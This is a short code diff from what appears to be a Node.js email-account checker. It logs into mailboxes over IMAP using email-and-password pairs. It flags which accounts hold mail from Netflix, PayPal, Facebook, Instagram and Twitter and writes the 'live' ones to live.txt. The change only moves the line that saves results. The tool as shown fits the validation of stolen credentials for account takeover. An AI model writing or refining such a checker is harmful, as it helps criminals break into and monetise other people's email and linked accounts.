@@ -150,14 +150,17 @@ const { ImapFlow } = require('imapflow');
                                 liveEntry += ' | Twitter ✅';
                             }
 
-                            fs.appendFileSync('live.txt', liveEntry + '\n', 'utf8');
                             console.log(chalk.green(`Filtered: ${emailAndPass} | Netflix: ${hasNetflixMail ? '✅' : '❌'} | PayPal: ${hasPayPalMail ? '✅' : '❌'} | Facebook: ${hasFacebookMail ? '✅' : '❌'} | Instagram: ${hasInstagramMail ? '✅' : '❌'} | Twitter: ${hasTwitterMail ? '✅' : '❌'}`));
 
                             await client.logout();
                         } catch (imapError) {
                             console.log(chalk.red(`Failed to fetch emails for: ${email}`));
                         }
+
                     }
+
+                    // store the data in live file
+                    fs.appendFileSync('live.txt', liveEntry + '\n', 'utf8');
                 }
                 callback();
             });
